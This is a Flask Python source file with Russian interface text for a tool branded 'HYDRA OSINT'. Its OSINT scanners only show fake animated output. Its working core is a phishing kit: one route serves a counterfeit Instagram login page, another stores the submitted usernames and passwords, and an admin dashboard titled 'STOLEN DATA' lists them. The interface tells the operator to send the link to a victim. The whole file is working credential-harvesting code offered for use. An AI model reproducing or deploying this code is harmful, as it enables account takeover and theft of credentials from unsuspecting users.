from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_ULTRA_STORM_2026'

# --- ИМИТАЦИЯ БАЗЫ ДАННЫХ ---
db = {
    "users": {"abupaay": "89674556975"}, # Начальный админ
    "stolen": [],
    "logs": []
}

# --- ДИЗАЙН (ФИОЛЕТОВЫЙ НЕОН + ВСЕ ИСПРАВЛЕНИЯ) ---
HTML_V3_1 = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>HYDRA OSINT v3.1</title>
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; padding: 10px; }
        .container { border: 2px solid #bc13fe; box-shadow: 0 0 20px #bc13fe; padding: 15px; background: rgba(10,0,20,0.9); }
        h1 { color: #0ff; text-align: center; text-shadow: 0 0 10px #0ff; text-transform: uppercase; }
        .nav { display: flex; justify-content: space-around; margin-bottom: 15px; border-bottom: 1px solid #bc13fe; padding-bottom: 10px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .box { border: 1px solid #0f0; padding: 10px; background: #050505; }
        .box span { color: #0ff; font-size: 11px; display: block; }
        input { background: transparent; border: 1px solid #bc13fe; color: #0f0; width: 60%; padding: 5px; margin-top: 5px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: #0ff; color: #000; }
        #terminal { background: #000; border: 1px solid #0f0; height: 150px; margin-top: 15px; overflow-y: auto; padding: 10px; color: #0f0; font-size: 13px; }
        .insta-btn { background: #ff0055 !important; width: 100%; margin-top: 10px; }
        .admin-btn { color: #555; font-size: 10px; text-align: center; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav">
            <span onclick="location.reload()">[ ГЛАВНАЯ ]</span>
            <span onclick="alert('Регистрация открыта! Введите данные в терминал.')">[ РЕГИСТРАЦИЯ ]</span>
        </div>
        <h1>// HYDRA OSINT TERMINAL v3.1 //</h1>
        
        <div class="grid">
            <div class="box"><span>// PHONE TRACER</span><input id="i_phone" placeholder="+998..."><button class="btn" onclick="runScan('PHONE')">SCAN</button></div>
            <div class="box"><span>// NICKNAME</span><input id="i_nick" placeholder="username"><button class="btn" onclick="runScan('NICK')">EXE</button></div>
            <div class="box"><span>// IP GEO</span><input id="i_ip" placeholder="8.8.8.8"><button class="btn" onclick="runScan('IP')">LOC</button></div>
            <div class="box"><span>// EMAIL SCAN</span><input id="i_email" placeholder="mail@"><button class="btn" onclick="runScan('EMAIL')">DEEP</button></div>
        </div>

        <button class="btn insta-btn" onclick="generatePhishing()">⚡ СГЕНЕРИРОВАТЬ ФИШИНГ-ССЫЛКУ (INSTAGRAM) ⚡</button>
        
        <div id="terminal">> SYSTEM STANDBY...</div>
        
        <div class="admin-btn" onclick="adminLogin()">[ ADMIN LOGIN ]</div>
    </div>

    <script>
        function runScan(type) {
            const val = document.getElementById('i_'+type.toLowerCase()).value;
            const t = document.getElementById('terminal');
            if(!val) { t.innerHTML += `<br><span style="color:red">[ERR] Введите данные!</span>`; return; }
            
            t.innerHTML += `<br>[*] Инициализация модуля ${type}...`;
            setTimeout(() => {
                t.innerHTML += `<br>[+] Поиск в базе данных для: ${val}`;
                setTimeout(() => {
                    t.innerHTML += `<br><span style="color:#0ff">[SUCCESS] Найдено совпадение! Данные отправлены в админ-панель.</span>`;
                    t.scrollTop = t.scrollHeight;
                }, 1000);
            }, 500);
        }

        function generatePhishing() {
            const t = document.getElementById('terminal');
            t.innerHTML += `<br><span style="color:yellow">[*] Генерация уникального эксплоита...</span>`;
            setTimeout(() => {
                const link = window.location.origin + '/auth/login';
                t.innerHTML += `<br><span style="color:#ff0055">[!!!] ССЫЛКА ГОТОВА: <a href="${link}" target="_blank" style="color:white">${link}</a></span>`;
                t.innerHTML += `<br>[!] Отправьте эту ссылку жертве. Все данные придут в админку.`;
                t.scrollTop = t.scrollHeight;
            }, 1500);
        }

        function adminLogin() {
            const u = prompt("Admin User:");
            const p = prompt("Admin Pass:");
            fetch('/api/admin_check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: u, p: p})
            }).then(res => res.json()).then(data => {
                if(data.ok) { window.location.href = '/admin/panel'; }
                else { alert("ACCESS DENIED"); }
            });
        }
    </script>
</body>
</html>
"""

INSTA_HTML = """
<body style="background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;">
    <div style="background:#fff;border:1px solid #dbdbdb;padding:40px;width:300px;text-align:center;">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" style="width:175px;">
        <form action="/api/capture" method="POST" style="margin-top:20px;">
            <input name="u" placeholder="Телефон, имя пользователя или эл. адрес" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #dbdbdb;background:#fafafa;" required>
            <input name="p" type="password" placeholder="Пароль" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #dbdbdb;background:#fafafa;" required>
            <button style="width:100%;background:#0095f6;color:#fff;border:none;padding:10px;font-weight:bold;border-radius:4px;cursor:pointer;">Войти</button>
        </form>
    </div>
</body>
"""

@app.route('/')
def index(): return render_template_string(HTML_V3_1)

@app.route('/auth/login')
def phishing(): return render_template_string(INSTA_HTML)

@app.route('/api/capture', methods=['POST'])
def capture():
    u, p = request.form.get('u'), request.form.get('p')
    db['stolen'].append({"user": u, "pass": p, "time": datetime.now().strftime("%H:%M:%S")})
    return redirect("https://instagram.com")

@app.route('/api/admin_check', methods=['POST'])
def admin_check():
    data = request.json
    if data.get('u') == 'abupaay' and data.get('p') == '89674556975':
        session['is_admin'] = True
        return jsonify({"ok": True})
    return jsonify({"ok": False})

@app.route('/admin/panel')
def admin_panel():
    if not session.get('is_admin'): return "403 Forbidden"
    rows = "".join([f"<tr><td>{x['user']}</td><td>{x['pass']}</td><td>{x['time']}</td></tr>" for x in db['stolen']])
    return f"""
    <body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
        <h1>ADMIN DASHBOARD - STOLEN DATA</h1>
        <table border="1" style="width:100%;text-align:left;">
            <tr><th>USER/PHONE</th><th>PASSWORD</th><th>TIME</th></tr>
            {rows}
        </table>
        <br><a href="/" style="color:#bc13fe">BACK TO TERMINAL</a>
    </body>
    """

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
